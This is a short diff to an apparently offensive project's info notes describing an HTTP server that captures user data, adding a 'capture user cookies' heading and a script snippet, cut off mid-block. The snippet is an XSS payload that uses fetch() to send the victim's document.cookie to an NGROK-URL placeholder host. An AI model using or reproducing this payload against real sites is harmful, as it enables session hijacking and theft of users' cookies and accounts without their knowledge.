@@ -1,5 +1,8 @@
 ## info
-http server capture user data by either sending the data in a query or in the body
+http server capture user data by either sending the data in a query or in the body.
+
+#### capture user cookies ####
+
 ```js
   <script>
       fetch(`https://NGROK-URL?cookie=${encodeURIComponent(document.cookie)}`)
